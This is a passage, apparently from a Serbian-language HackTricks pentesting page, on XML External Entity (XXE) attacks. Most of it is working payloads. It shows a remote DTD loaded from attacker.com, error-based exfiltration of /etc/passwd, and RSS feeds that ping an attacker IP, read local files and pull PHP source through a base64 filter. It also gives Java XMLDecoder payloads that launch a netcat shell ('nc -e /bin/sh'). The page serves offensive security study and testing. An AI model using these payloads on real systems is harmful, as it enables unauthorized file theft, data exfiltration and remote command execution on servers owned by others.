<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
Ovaj pristup otkriva da User Agent ukazuje na korišćenje Java 1.8. Zapaženo ograničenje ove verzije Jave je nemogućnost preuzimanja fajlova koji sadrže karakter novog reda, kao što je /etc/passwd, koristeći Out of Band tehniku.

Izvlačenje podataka zasnovano na grešci Da bi se prevazišlo ovo ograničenje, koristi se pristup zasnovan na grešci. DTD fajl je strukturiran na sledeći način da izazove grešku koja uključuje podatke iz ciljnog fajla:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/'>">
%foo;
%xxe;
```
Server odgovara greškom, što je važno jer odražava nepostojeći fajl, ukazujući da server pokušava da pristupi navedenom fajlu:
```javascript
{"status":500,"error":"Internal Server Error","message":"IO error.\nReason: /nofile (No such file or directory)"}
```
Da biste uključili sadržaj datoteke u poruku o grešci, DTD datoteka se prilagođava:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/%data;'>">
%foo;
%xxe;
```
Ova modifikacija dovodi do uspešne eksfiltracije sadržaja datoteke, jer se odražava u izlazu greške poslatom putem HTTP-a. To ukazuje na uspešan XXE (XML External Entity) napad, koristeći kako Out of Band tako i Error-Based tehnike za ekstrakciju osetljivih informacija.

## RSS - XEE

Validan XML sa RSS formatom za iskorišćavanje XXE ranjivosti.

### Ping back

Jednostavan HTTP zahtev ka serveru napadača
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "http://<AttackIP>/rssXXE" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>XXE Test Blog</title>
<link>http://example.com/</link>
<description>XXE Test Blog</description>
<lastBuildDate>Mon, 02 Feb 2015 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>Test Post</description>
<author>author@example.com</author>
<pubDate>Mon, 02 Feb 2015 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### Pročitaj fajl
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### Čitanje izvornog koda

Korišćenje PHP base64 filtera
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///challenge/web-serveur/ch29/index.php" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
## Java XMLDecoder XEE do RCE

XMLDecoder je Java klasa koja kreira objekte na osnovu XML poruke. Ako zlonameran korisnik može da natera aplikaciju da koristi proizvoljne podatke u pozivu metodi **readObject**, odmah će dobiti izvršenje koda na serveru.

### Korišćenje Runtime().exec()
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<object class="java.lang.Runtime" method="getRuntime">
<void method="exec">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
</void>
</object>
</java>
```
### ProcessBuilder
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
<void method="start" id="process">
</void>
</void>
</java>
```
## Alati

{% embed url="https://github.com/luisfontes19/xxexploiter" %}

## Reference

- [https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf](https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf)\\
- [https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html](https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html)\\
- Izvuci informacije putem HTTP koristeći svoj eksterni DTD: [https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/](https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/)\\
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection)\\
- [https://gist.github.com/staaldraad/01415b990939494879b4](https://gist.github.com/staaldraad/01415b990939494879b4)\\
- [https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9](https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9)\\
- [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)\\
- [https://gosecure.github.io/xxe-workshop/#7](https://gosecure.github.io/xxe-workshop/#7)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{{#include ../banners/hacktricks-training.md}}
